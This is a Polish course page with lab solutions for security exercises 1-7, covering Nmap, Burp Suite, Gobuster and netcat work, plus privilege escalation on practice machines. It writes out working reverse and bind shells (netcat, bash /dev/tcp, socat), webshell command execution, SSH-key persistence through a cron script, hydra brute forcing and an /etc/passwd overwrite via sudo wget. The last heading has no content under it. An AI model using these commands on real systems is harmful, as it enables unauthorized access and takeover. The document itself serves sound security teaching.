---
title: Rozwiązania - ćwiczenia 1-7
description: "101 rozwiązań BSI: polecenia, kroki w Burp Suite oraz warianty podstawowe i PENTEST z repozytorium."
updated: 2026-11-15
order: 10
archive: true
---

## Jak korzystać z rozwiązań

Zebrano **101 zadań z ćwiczeń 1-7**: 66 podstawowych i 35 PENTEST. Numeracja odpowiada plikom `cw01.md`-`cw07.md` i ich wariantom `_p.md` w [repozytorium BSI](https://github.com/M1CH4L9/BSI). Ćwiczenie 9 nie wchodzi w zakres.

Polecenia i konkretne wartości pochodzą z Twoich rozwiązań. Instrukcje dotyczące interfejsu Burpa zapisano po polsku jako kroki, a przykłady wyników oddzielono od komend. **Nie wpisuj dosłownie `[ANSWER]`, `[IP_STUDENTA]`, `[ANSWER_FROM_2.4]` ani `TARGET_IP`** - zastąp je odpowiedzią lub adresem odczytanym w swoim laboratorium.

<div class="callout"><strong>Środowisko ćwiczeniowe</strong>To zapis rozwiązań dla maszyn laboratoryjnych BSI. Adresy, hasła, nazwy kont i plików są zależne od instancji. Uwagi przy zadaniach wskazują rozbieżności między repozytorium a PDF-ami; poleceń z tych notatek nie wykonywano na zdalnych maszynach.</div>

W podstawowych zadaniach 1.2-1.15 źródło poleca wpisać znalezioną odpowiedź w konsoli. W innych zadaniach flagę zwykle wpisujesz na platformie albo zadanie zalicza się automatycznie. Treść bieżącego zadania określa właściwy sposób oddania.

Zobacz też: [Spis komend](/przedmioty/bsi/bsi-spis-komend/) i [Przygotowanie kolokwium 1](/przedmioty/bsi/bsi-kolokwium-1/).

## Ćwiczenie 1 - Podstawy systemu Linux

**Część podstawowa** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw01/cw01.md).

### 1.1 - Połączenie SSH

```bash
ssh student@192.168.100.101   # hasło: pjatk
```

### 1.2 - Bieżący użytkownik i UID

```bash
echo $USER
id
```

Odczytaj liczbę UID z wyniku `id`. W oryginale występuje `id [user]`: opcjonalną nazwę użytkownika zastąp rzeczywistą nazwą albo ją pomiń. Zapis `uid=[ANSWER](student)` to wzór wyniku, nie polecenie.

### 1.3 - Zalogowani użytkownicy

```bash
who
```

W zapisie źródłowym drugim aktywnym użytkownikiem jest `root`. Odpowiedź sprawdź na bieżącej maszynie.

### 1.4 - Wersja dystrybucji

```bash
cat /etc/os-release
```

Odczytaj nazwę kodową dystrybucji z `PRETTY_NAME` lub `VERSION_CODENAME`. Źródło pokazuje `Debian GNU/Linux 12 ([ANSWER])`.

### 1.5 - Producent procesora

```bash
cat /proc/cpuinfo
```

Odczytaj wartość `vendor_id`: to pole odpowiada producentowi procesora.

### 1.6 - Kontroler SCSI

```bash
lspci
```

Znajdź `SCSI storage controller`. Źródłowy wzór wyniku: `[ANSWER] / LSI 53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI (rev 01)`.

### 1.7 - Największa partycja

```bash
df -h
```

Wskaż nazwę największej partycji bez prefiksu `/dev/`. Źródło pokazuje wiersz `/dev/[ANSWER] 5.8G 2.3G 3.3G 41% /`.

### 1.8 - Brama domyślna

```bash
ip r
```

Odczytaj adres za `default via`. Źródłowy wzór: `default via [ANSWER] dev eth0 onlink`.

### 1.9 - Wiadomość w procesach

```bash
ps aux
```

Znajdź proces, którego wiersz poleceń zawiera `The Secret Message is: [ANSWER]`. Widoczne tam `sh -c`, `echo` i `sleep 31337` są częścią informacji o procesie.

### 1.10 - Ukryty plik

```bash
ls -a
cat .secret
```

Odpowiedź znajduje się wewnątrz ukrytego pliku `.secret`.

### 1.11 - Kopiowanie pliku

```bash
cp /etc/passwd ~
```

Kopia pliku trafia do katalogu domowego bieżącego użytkownika.

### 1.12 - Szukanie FINDME

```bash
locate FINDME
cat /opt/FINDME
```

Odczytaj znaleziony plik. Ścieżka `/opt/FINDME` pochodzi z rozwiązania w repozytorium.

### 1.13 - Szukanie w treści pliku

```bash
grep solution WORDS
```

Odpowiedź jest słowem obok `solution` w wyniku wyszukiwania: `solution [ANSWER]`.

### 1.14 - Status usługi

```bash
systemctl status SOLUTION
```

Odczytaj opis usługi: `SOLUTION.service - Secret message (type in terminal): [ANSWER]`.

### 1.15 - Prywatny crontab

```bash
crontab -e
```

W źródle po otwarciu edytora wybrano opcję `1`. W osobistym crontabie znajdź wpis `@reboot echo Solution is [ANSWER]`. Do samego odczytu nadaje się też `crontab -l`; nie musisz zmieniać harmonogramu.

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw01/cw01_p.md).

### 1.1p - Dostęp przez maszynę pośrednią

```bash
ssh student@192.168.100.101 #pjatk
ssh pentest@192.168.200.151
```

### 1.2p - Zadanie cron i klucz SSH

> **Uwaga do rozwiązania:** W oryginale autor zaznacza niepewność tego kroku. Najpierw sprawdź właściciela, uprawnienia i ścieżkę zadania cron. Repozytorium używa `/opt/clean.sh`, slajdy `/home/developer/clean.sh`. Zmiana zadziała dopiero po uruchomieniu zadania cron jako `developer`; nie jest to natychmiastowe wykonanie.

```bash
cat /etc/crontab
ls -l /opt/clean.sh
echo "mkdir -p /home/developer/.ssh" >> /opt/clean.sh
echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh
```

### 1.3p - Logowanie jako developer

> **Uwaga do rozwiązania:** Przed wyjściem sprawdź, czy cron dopisał klucz do pliku developera. `exit` powinno wrócić na maszynę pośrednią, z której wykonujesz kolejne SSH.

```bash
#If 1.2 worked on 3rd command, before exit type 'echo "echo $(cat /home/pentest/.ssh/authorized_keys) >> /home/developer/.ssh/authorized_keys" >> /opt/clean.sh' too
exit
ssh developer@192.168.200.151
```

### 1.4p - Hasło w pozostawionym pliku

> **Uwaga do rozwiązania:** Repozytorium wskazuje `.password.txt.swp`, natomiast PDF 1p na s. 15 wskazuje `.bash_history`. To dwa warianty wycieku; odczytaj plik obecny w Twoim środowisku.

```bash
cat .password.txt.swp
# Odczytaj odpowiedź z wyświetlonego pliku.
su
#Type [ANSWER] as password
```

### 1.5p - Flaga roota

```bash
cat /root/root.txt
# Odczytaj odpowiedź z wyświetlonego pliku.
#Copy flag to website
```

## Ćwiczenie 2 - Enumeracja usług sieciowych

**Część podstawowa** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw02/cw02.md).

### 2.1 - Pierwszy skan Nmap

> **Uwaga do rozwiązania:** Pierwszy skan wykonaj na Kali. Po SSH kolejne skany wewnętrznej sieci wykonuj na maszynie ćwiczeniowej. Źródło zaleca ponowienie lub reset maszyny, jeśli system nie zaliczy poprawnej sekwencji.

```bash
nmap -A 192.168.100.102
ssh student@192.168.100.102 -p 23
nmap -A 192.168.100.102
#Its sometimes bugged and doesnt count. If you have problems then reset and restart machine then paste commands in correct order
```

### 2.2 - SSH na wykrytym porcie

```bash
ssh student@192.168.100.102 -p 23
#If port is wrong, then go back to nmap from h 2.1 and find correct port
```

### 2.3 - Dokumentacja Nmap

```bash
man nmap
```

### 2.4 - Odkrywanie hostów

```bash
nmap -sn 10.13.37.0/24
```

**Przykładowy wynik ze źródła:**

```text
Nmap scan report for [ANSWER]
```

Odczytaną odpowiedź lub flagę wpisz na platformie.

### 2.5 - Otwarte porty TCP

```bash
nmap -sT [ANSWER_FROM_2.4]
```

**Przykładowy wynik ze źródła:**

```text
[ANSWER]/tcp open  msolap-ptp2
```

Odczytaną odpowiedź lub flagę wpisz na platformie.

### 2.6 - Wersja usługi

```bash
nmap -sV [ANSWER_FROM_2.4]
```

**Przykładowy wynik ze źródła:**

```text
2725/tcp open  http    nginx [ANSWER]
```

Odczytaną odpowiedź lub flagę wpisz na platformie.

### 2.7 - Domyślne skrypty NSE

```bash
nmap -sC -sV [ANSWER_FROM_2.4]
```

**Przykładowy wynik ze źródła:**

```text
|_[ANSWER]
```

Odczytaną odpowiedź lub flagę wpisz na platformie.

### 2.8 - Rozpoznawanie systemu

```bash
nmap -O --osscan-guess [ANSWER_FROM_2.4]
```

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw02/cw02_p.md).

### 2.1p - Pełniejszy skan Nmap

> **Uwaga do rozwiązania:** Wykonaj skan z maszyny ćwiczeniowej dostępnej przez SSH z zadania 2.2. Detekcja systemu `-O` wymaga odpowiednich uprawnień; w razie błędu nie zakładaj, że cel jest wyłączony.

```bash
nmap -sT -sV -sC -O --osscan-guess -p- -vv 192.168.200.152
```

### 2.2p - Flaga przez HTTP

> **Uwaga do rozwiązania:** Port `8080` pochodzi z rozwiązania. Numer portu HTTP ustal ze skanu; nie zakładaj portu 80.

```bash
curl http://192.168.200.152:8080/flag2.2p.txt
```

Odczytaj flagę z wyniku i wpisz ją na platformie.

### 2.3p - Flaga przez FTP

W zwykłym terminalu uruchom klienta FTP:

```bash
ftp 192.168.200.152
```

Zaloguj się jako `anonymous`, podając dowolne hasło. W kliencie FTP wpisz:

```text
get flag2.3p.txt
exit
```

Po wyjściu z klienta odczytaj lokalny plik:

```bash
cat flag2.3p.txt
```

Odczytaną flagę wpisz na platformie.

### 2.4p - Flaga przez SMB

W zwykłym terminalu otwórz udział SMB:

```bash
smbclient -N //192.168.200.152/FLAG
```

W interaktywnym kliencie wpisz:

```text
get flag2.4p.txt
exit
```

Po wyjściu z klienta odczytaj lokalny plik:

```bash
cat flag2.4p.txt
```

Odczytaną flagę wpisz na platformie.

## Ćwiczenie 3 - Bezpieczeństwo Web - wprowadzenie

**Część podstawowa** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw03/cw03.md).

### 3.1 - Historia HTTP i flaga w nagłówku

1. Uruchom Burp Suite i jego przeglądarkę.
2. Otwórz `http://192.168.100.103/`.
3. W historii HTTP wybierz żądanie do `/` i sprawdź **Response**, w tym nagłówki.
4. Odczytaj wartość nagłówka `FLAG_3_1` i wpisz ją na platformie.

### 3.2 - Intercept i zmiana parametru

> **Uwaga do rozwiązania:** W PDF na s. 24 jest parametr `autosolve=no` zmieniany na `yes`; repozytorium używa `solve=0` → `solve=1`. Zmieniaj parametr faktycznie obecny w żądaniu.

1. Otwórz **Proxy → Intercept** i włącz przechwytywanie.
2. Wejdź na `http://192.168.100.103/` i znajdź odpowiednie żądanie **POST**.
3. Zmień `solve=0` na `solve=1`.
4. Kliknij **Forward**. Po zakończeniu wyłącz Intercept, aby nie zatrzymywać pozostałych żądań.

### 3.3 - Powtarzanie głosowania w Repeaterze

> **Uwaga do rozwiązania:** Slajdy opisują głosowanie na NIE, a Twoje rozwiązanie używa `vote=YES`. Zachowano wersję repozytorium; w konkretnej instancji sprawdź treść formularza i oczekiwany wynik.

1. Otwórz `http://192.168.100.103/vote/` i zagłosuj **YES**, zgodnie z rozwiązaniem z repozytorium.
2. Znajdź żądanie **POST** z `vote=YES` w historii lub drzewie **Target**.
3. Kliknij prawym przyciskiem i wybierz **Send to Repeater**.
4. W Repeaterze wyślij żądanie kilka razy przyciskiem **Send**.

### 3.4 - Automatyzacja głosowania w Intruderze

> **Uwaga do rozwiązania:** Zrzut na s. 35 PDF pokazuje też śledzenie przekierowań **Always** oraz przetwarzanie cookies w przekierowaniach. Dostosuj te ustawienia, jeśli bez nich głosy nie są zaliczane.

1. Wyślij żądanie głosowania z `vote=YES` do **Intrudera**.
2. Wyczyść zbędne znaczniki przyciskiem **Clear §**.
3. Ustaw **Payload type → Null payloads** i **Generate → 100**.
4. Uruchom **Start attack** i poczekaj na wyniki. Jeśli zadanie wymaga ponad 100 głosów, uwzględnij głosy wysłane wcześniej lub zwiększ liczbę powtórzeń.

### 3.5 - Dekodowanie Base64

1. Otwórz `http://192.168.100.103/encoded/`.
2. Skopiuj zakodowaną flagę do **Decoder**.
3. Wybierz **Decode as… → Base64**.
4. Wpisz odkodowaną flagę na platformie.

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw03/cw03_p.md).

### 3.1p - Modyfikacja ciasteczka

> **Uwaga do rozwiązania:** W PDF występuje ciasteczko `admin`, w repozytorium `debug`. Nie dodawaj losowego ciasteczka: sprawdź rzeczywiste żądanie.

1. Otwórz `http://192.168.100.153/` w przeglądarce Burpa.
2. Wyślij żądanie do `/` do **Repeatera**.
3. Zmień `Cookie: debug=false` na `Cookie: debug=true` i wyślij żądanie.

### 3.2p - Przejście do danych użytkowników

1. Otwórz `http://192.168.100.153/login/`.
2. Wyślij żądanie do **Repeatera** i ustaw `Cookie: debug=true`.
3. Zmień ścieżkę z `GET /login/` na `GET /usersdata/` i kliknij **Send**.

### 3.3p - Enumeracja identyfikatorów

1. Wyślij żądanie do `/login/` do **Intrudera**.
2. Ustaw ścieżkę `GET /usersdata/4/` i ciasteczko `debug=true`.
3. Wyczyść zbędne pozycje; zaznacz samą cyfrę `4` i kliknij **Add §**. Wynik: `/usersdata/§4§/`.
4. Wybierz **Numbers**: od `1` do `50`, krok `1`.
5. Uruchom **Start attack** i porównaj odpowiedzi.

### 3.4p - Dekodowanie adresu Hackera

1. W wynikach Intrudera znajdź użytkownika **Hacker**; w rozwiązaniu ma identyfikator `48`.
2. Skopiuj jego zakodowane dane do **Decoder** i wybierz **Decode as… → Base64**.
3. Odczytany adres otwórz w Repeaterze. Ścieżka ze źródła: `GET /h4ck3r1333733x/`.
4. Kliknij **Send**.

### 3.5p - Deobfuskacja JavaScript

> **Uwaga do rozwiązania:** Nazwy ukrytych plików różnią się między PDF a repozytorium. Rozstrzygający jest kod uzyskany z Twojej instancji.

1. Skopiuj kod JavaScript z odpowiedzi strony Hackera.
2. W narzędziu [do deobfuskacji z ćwiczenia](https://obf-io.deobfuscate.io/) pozostaw sam JavaScript, bez nagłówków HTTP i znaczników `<script>`.
3. Wybierz **Deobfuscate** i odszukaj `console.log("secrets31337.php")`.
4. W Repeaterze wyślij żądanie do `/h4ck3r1333733x/secrets31337.php`.
5. Odczytaj flagę z odpowiedzi i wpisz na platformie.

## Ćwiczenie 4 - Enumeracja zasobów serwisów WWW

**Część podstawowa** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw04/cw04.md).

**Przygotowanie SecLists**
```bash
#Install SecLists before using Gobuster (choose one option)
sudo apt install seclists #Installs to /usr/share/seclists
#OR
git clone https://github.com/danielmiessler/SecLists.git #If cloned, change the -w path below
```

### 4.1 - Enumeracja katalogów

```bash
gobuster dir -u http://192.168.100.104/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -r
```

### 4.2 - Enumeracja plików

```bash
gobuster dir -u http://192.168.100.104/misc/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
```

### 4.3 - Enumeracja hostów wirtualnych

```bash
gobuster vhost -u http://192.168.100.104/ -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt
```

### 4.4 - Enumeracja subdomen

```bash
gobuster vhost -u http://192.168.100.104/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain channel --append-domain
```

### 4.5 - Fuzzing parametru password

> **Uwaga do rozwiązania:** Wartość `334` to rozmiar typowej nieudanej odpowiedzi w zapisanej instancji. Ustal aktualny rozmiar przed filtrowaniem, aby nie ukryć poprawnej odpowiedzi.

```bash
gobuster fuzz -u 'http://192.168.100.104/4.5.php?password=FUZZ' -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100000.txt --exclude-length 334
```

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw04/cw04_p.md).

### 4.1p - Nazwa z certyfikatu

> **Uwaga do rozwiązania:** Wartości `developer` i `192.168.100.154` pochodzą z repozytorium. Odczytaj nazwę z certyfikatu swojej maszyny przed dodaniem wpisu do hosts.

```bash
#Open https://192.168.100.154/ in browser and check 'View Certificate' -> 'Common Name' (developer)
echo '192.168.100.154 developer' | sudo tee -a /etc/hosts
#Open https://developer/ in browser
```

### 4.2p - Odkrycie subdomeny

```bash
gobuster vhost -u https://developer/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain developer --append-domain -k
#Found beta.developer
echo '192.168.100.154 beta.developer' | sudo tee -a /etc/hosts
#Open https://beta.developer/ in browser
```

### 4.3p - Katalog administratora

```bash
gobuster dir -u https://beta.developer/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -k
#Open https://beta.developer/admin/ in browser
```

### 4.4p - Plik panelu logowania

```bash
gobuster dir -u https://beta.developer/admin/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -k
```

### 4.5p - Słownikowy test hasła

```bash
hydra -l anything -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt 'https-post-form://beta.developer/admin/index_admin.php:p=^PASS^:Wrong password'
```

## Ćwiczenie 5 - Protokoły sieciowe

**Część podstawowa** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw05/cw05.md).

### 5.1 - Pobranie pliku przez TCP - connect

```bash
nc 192.168.100.105 12301 > tcpconnect.png
```

### 5.2 - Wysłanie pliku przez TCP - connect

```bash
cat tcpconnect.png | nc 192.168.100.105 32101
```

### 5.3 - Pobranie pliku przez UDP - connect

```bash
echo | nc -u 192.168.100.105 12302 -w 5 > udpconnect.png
```

### 5.4 - Wysłanie pliku przez UDP - connect

```bash
cat udpconnect.png | nc -u 192.168.100.105 32102 -w 5
```

### 5.5 - Pobranie pliku przez TCP - listen

```bash
nc -lvp 12303 > tcplisten.png
```

### 5.6 - Wysłanie pliku przez TCP - listen

```bash
cat tcplisten.png | nc -lvp 32103
```

### 5.7 - Pobranie pliku przez UDP - listen

```bash
nc -luvp 12304 -w 30 > udplisten.png
#If SHA1 differs, retry (UDP may lose packets)
```

### 5.8 - Wysłanie pliku przez UDP - listen

```bash
cat udplisten.png | nc -ulvp 32104
#CTRL-C after "UPLOADED"
```

### 5.9 - Serwer HTTP w Pythonie

> **Uwaga do rozwiązania:** Serwer udostępnia bieżący katalog. Na systemie ograniczającym nasłuch na porcie 80 mogą być potrzebne dodatkowe uprawnienia. Nie uruchamiaj równocześnie drugiego serwera na tym samym adresie i porcie.

```bash
python3 -m http.server 80
#Wait for auto-completion; retry if needed
```

### 5.10 - Serwer HTTP Apache

```bash
#Stop Python server with CTRL-C before starting Apache (same port 80)
#Only if Apache2 is not installed:
sudo apt update && sudo apt install apache2
sudo systemctl start apache2
```

### 5.11 - Serwer HTTPS Apache

```bash
sudo a2enmod ssl
sudo a2ensite default-ssl.conf
sudo systemctl restart apache2
```

### 5.12 - Serwer FTP w Pythonie

```bash
#If not installed:
sudo apt update && sudo apt install python3-pyftpdlib
sudo python3 -m pyftpdlib -p 21
```

### 5.13 - Serwer SMB

```bash
locate smbserver.py
#If missing: sudo apt install python3-impacket
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 0.0.0.0 -smb2support pjatksmbshare "$HOME"
```

### 5.14 - Serwer SSH do kopiowania plików

```bash
#If not installed:
sudo apt install openssh-server
sudo systemctl start ssh
```

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw05/cw05_p.md).

### 5.1p - Przeniesienie statycznego Nmap

```bash
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.105:/home/student
ssh student@192.168.100.105 #Password: pjatk
tar zxvf nmap-x64.tar.gz
```

### 5.2p - Skan z sieci wewnętrznej

```bash
#Replace TARGET_IP with the IP from homework [H]
./nmap -n -Pn -sV -p- -vv TARGET_IP
```

### 5.3p - Pobranie udostępnionych plików

```bash
ssh student@192.168.100.105 #Password: pjatk
wget -r --no-parent http://192.168.200.155/
```

### 5.4p - Logowanie kluczem SSH

> **Uwaga do rozwiązania:** Użytkownik `wwwadmin` jest z repozytorium; PDF podaje `webadmin`. Właściciela klucza ustal z dostępnych danych, m.in. komentarza klucza publicznego.

```bash
#On student@192.168.100.105:
cat ~/192.168.200.155/.ssh/id_ed25519.pub
chmod 600 ~/192.168.200.155/.ssh/id_ed25519
ssh -i ~/192.168.200.155/.ssh/id_ed25519 wwwadmin@192.168.200.155
```

### 5.5p - Eskalacja przez sudo

```bash
#After SSH login from 5.4
sudo su
cat /root/root.txt
#Copy the flag and submit it on the platform
```

## Ćwiczenie 6 - Zdalne powłoki

**Część podstawowa** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw06/cw06.md).

### 6.1 - Połączenie reverse TCP

> **Uwaga do rozwiązania:** Adres `[IP_STUDENTA]` to Twój adres interfejsu VPN, zwykle `tun0`. W tej sekcji komentarze Kali / Remote Shells wskazują miejsce wykonania.

```bash
#Kali - check your VPN IP (tun0):
ip addr show tun0
#inet [IP_STUDENTA] peer 10.65.0.5/32 scope global tun0
nc -lvp 12301

#Second terminal (Kali -> Remote Shells HOMEWORK):
ssh student@192.168.100.106 #Password: pjatk
nc [IP_STUDENTA] 12301 #Replace [IP_STUDENTA] with your VPN IP
```

### 6.2 - Reverse shell przez Netcat

> **Uwaga do rozwiązania:** Opcja `-e` jest dostępna tylko w części odmian Netcata. Jej brak w zainstalowanej wersji nie oznacza błędu w adresie lub porcie.

```bash
#Kali (terminal 1):
nc -lvp 12302

#Remote Shells HOMEWORK (terminal 2):
nc [IP_STUDENTA] 12302 -e /bin/bash #Replace [IP_STUDENTA] with your VPN IP
```

### 6.3 - Reverse shell przez Bash

```bash
#Kali (terminal 1):
nc -lvp 12303

#Remote Shells HOMEWORK (terminal 2):
bash -i >& /dev/tcp/[IP_STUDENTA]/12303 0>&1
```

### 6.4 - Reverse shell przez socat

```bash
#Kali (terminal 1): exit the 6.3 reverse shell first (if still connected)
socat file:`tty`,raw,echo=0 tcp-listen:12304

#Remote Shells HOMEWORK (terminal 2):
socat tcp-connect:[IP_STUDENTA]:12304 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

### 6.5 - Połączenie bind TCP

```bash
#!!!IMPORTANT!!!: roles switched! Server listens, Kali connects.

#Remote Shells HOMEWORK (terminal 1):
nc -lvp 32101

#Kali (terminal 2):
nc 192.168.100.106 32101
```

### 6.6 - Bind shell przez Netcat

```bash
#Remote Shells HOMEWORK (terminal 1):
nc -lvp 32102 -e /bin/bash

#Kali (terminal 2):
nc 192.168.100.106 32102
```

### 6.7 - Bind shell przez socat

```bash
#Remote Shells HOMEWORK (terminal 1):
socat TCP-LISTEN:32103,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

#Kali (terminal 2):
socat FILE:`tty`,raw,echo=0 TCP:192.168.100.106:32103
```

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw06/cw06_p.md).

### 6.1p - Przeglądarka Lynx

```bash
ssh student@192.168.100.106 #Password: pjatk
lynx 192.168.200.156
```

### 6.2p - Ujawniony plik tymczasowy

> **Uwaga do rozwiązania:** Źródło wykorzystuje `.command.txt.swp`; slajdy `.bash_history`. Oba warianty ujawniają sposób użycia webshella.

```bash
lynx 192.168.200.156
#Open the hidden .command.txt.swp file from the directory listing
```

### 6.3p - Wykonanie polecenia przez webshell

```bash
#Quit Lynx with q, then run on student@remote-shells-homework:
curl 'http://192.168.200.156/cmd.php?c=id%20webadmin'
```

### 6.4p - Bind shell uruchomiony przez HTTP

> **Uwaga do rozwiązania:** Oba terminale są na maszynie pośredniej. Pierwsze żądanie curl może czekać, dopóki działa uruchomiona powłoka. Łączysz się z nią z drugiego terminala.

```bash
#Remote Shells HOMEWORK - terminal 1:
curl 'http://192.168.200.156/cmd.php?c=nc+-e+/bin/bash+-lvp+7331'

#Remote Shells HOMEWORK - terminal 2:
nc 192.168.200.156 7331
```

### 6.5p - Flaga roota

```bash
#Use the nc terminal from 6.4 (rerun 6.4 if closed):
sudo su
cat /root/root.txt
#Submit the flag on the platform
```

## Ćwiczenie 7 - Wykrywanie tylnych furtek

**Część podstawowa** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw07/cw07.md).

### 7.1 - Przesłanie linPEAS

```bash
#Kali - download only if linpeas.sh is not already present:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh student@192.168.100.107:/home/student
```

### 7.2 - Uruchomienie linPEAS

```bash
ssh student@192.168.100.107 #Password: pjatk
bash linpeas.sh
```

### 7.3 - System 0 - punkt odniesienia

> **Uwaga do rozwiązania:** To czysty system odniesienia. Hasło `toor` jest podane w scenariuszu; ten krok nie dowodzi znalezienia tylnej furtki.

```bash
ssh system0@192.168.100.107 -p 2200 #Password: pjatk
su #Password: toor
/root/solve
```

### 7.4 - System 1 - ukryta powłoka z SUID

```bash
ssh system1@192.168.100.107 -p 2201 #Password: pjatk
ls -la
bash linpeas.sh #Check SUID files
./.zsh_history #Hidden SUID backdoor (root shell)
/root/solve
```

### 7.5 - System 2 - szukanie pliku z SUID

```bash
ssh system2@192.168.100.107 -p 2202 #Password: pjatk
find / -type f -perm /6000 2>/dev/null #Find SUID/SGID files
/usr/sbin/delete #Hidden SUID backdoor (root shell)
/root/solve
```

### 7.6 - System 3 - Bash z zachowaniem uprawnień

> **Uwaga do rozwiązania:** `bash -p` zachowuje zastane efektywne uprawnienia, jeśli uruchamiany Bash ma odpowiednie SUID. Samo `-p` nie nadaje roota zwykłemu użytkownikowi.

```bash
ssh system3@192.168.100.107 -p 2203 #Password: pjatk
find / -type f -perm /6000 2>/dev/null #Find SUID/SGID files
bash -p #Keep effective root privileges from SUID bash
/root/solve
```

### 7.7 - System 4 - porównanie sum plików

> **Uwaga do rozwiązania:** Porównuj z system0 o tej samej wersji pakietów. Inna suma pliku jest wskazówką do analizy, a nie samodzielnym dowodem backdoora. W repozytorium podmieniono `chfn`; w slajdach jest inna ścieżka.

```bash
ssh system4@192.168.100.107 -p 2204 #Password: pjatk
find / -type f -perm /6000 -exec sha1sum {} \; 2>/dev/null
#Compare SHA1 with system0 (same command)
/usr/bin/chfn #Modified SUID binary (root shell)
/root/solve
```

### 7.8 - System 5 - sudo i Perl

```bash
ssh system5@192.168.100.107 -p 2205 #Password: pjatk
sudo -l #Check allowed commands
sudo /usr/bin/perl -e 'system("/root/solve");' #Run as root
```

### 7.9 - System 6 - sudo i vi

> **Uwaga do rozwiązania:** `sudo vi` wykonujesz w powłoce. Polecenie `:!bash` wpisujesz dopiero wewnątrz edytora vi, bez komentarza.

```bash
ssh system6@192.168.100.107 -p 2206 # hasło: pjatk
sudo -l
sudo vi
```

W edytorze vi wpisz:

```text
:!bash
```

W otwartej powłoce roota uruchom:

```bash
/root/solve
```

### 7.10 - System 7 - dodatkowe konto z UID 0

> **Uwaga do rozwiązania:** Istotny jest UID `0`, także dla konta nazwanego `backup`. Puste pole hasła może umożliwiać logowanie bez hasła w konfiguracji laboratorium; wynik zależy też od zasad uwierzytelniania.

```bash
ssh system7@192.168.100.107 -p 2207 #Password: pjatk
cat /etc/passwd #Find backup::0:0 (UID 0, empty password)
su backup
/root/solve
```

### 7.11 - System 8 - sudo i nadpisanie pliku

> **Uwaga do rozwiązania:** Ten scenariusz laboratoryjny celowo nadpisuje `/etc/passwd`. Repozytorium dopuszcza `wget`, PDF używa `curl`. Zachowano wersję z repozytorium, w tym kopię `passwd-original`. W `wget` duże `-O` wskazuje plik wyjściowy; małe `-o` zapisuje dziennik.

```bash
ssh system8@192.168.100.107 -p 2208 #Password: pjatk
sudo -l #Only wget is allowed
cp /etc/passwd .
sed -i s/root:x/root:/ ./passwd
#Second SSH terminal on system8:
python3 -m http.server 8000
#Back in first terminal:
wget http://127.0.0.1:8000/passwd -O passwd-test #Test download
cp /etc/passwd ./passwd-original
sudo wget http://127.0.0.1:8000/passwd -O /etc/passwd #Use capital O
su
/root/solve

```

### 7.12 - System 9 - lokalny bind shell

> **Uwaga do rozwiązania:** Adres `127.0.0.11` i port `54321` są ze źródła. Sprawdź je przez `ss` i `ps` na docelowym systemie9; lokalny adres loopback odnosi się do tej maszyny.

```bash
ssh system9@192.168.100.107 -p 2209 #Password: pjatk
ss -tlpn #Find listening port 54321
ps aux #Find root socat listener
socat FILE:`tty`,raw,echo=0 TCP:127.0.0.11:54321
/root/solve
```

**PENTEST** · [plik źródłowy](https://github.com/M1CH4L9/BSI/blob/main/cw07/cw07_p.md).

### 7.1p - Przeniesienie Nmap

```bash
#Kali:
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.107:/home/student

#Homework server:
ssh student@192.168.100.107 #Password: pjatk
tar zxvf nmap-x64.tar.gz
```

### 7.2p - Skan wewnętrznego hosta

```bash
#Run on student@backdoor-detection-homework:
./nmap -p- -n -Pn -sV -vv 192.168.200.157
```

### 7.3p - Połączenie z bind shellem

```bash
#On student@backdoor-detection-homework:
nc 192.168.200.157 1234 #Bind shell port found by Nmap in 7.2p
```

### 7.4p - Przeniesienie linPEAS przez HTTP

> **Uwaga do rozwiązania:** Adres `192.168.200.107` to interfejs maszyny pośredniej widoczny z sieci wewnętrznej. Serwer HTTP uruchom w katalogu z `linpeas.sh` i pozostaw działający na czas pobierania.

```bash
#Kali - copy linpeas.sh if missing on the homework server:
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh student@192.168.100.107:/home/student

#Terminal 1 - student@192.168.100.107:
python3 -m http.server 1234

#Terminal 2 - student@192.168.100.107:
nc 192.168.200.157 1234
#Inside the bind shell (admin):
wget http://192.168.200.107:1234/linpeas.sh
```

### 7.5p - Analiza przez linPEAS

```bash
#Inside the bind shell (admin@backdoor-detection-pentest-homework):
bash linpeas.sh
```

### 7.6p - Konto root bez hasła

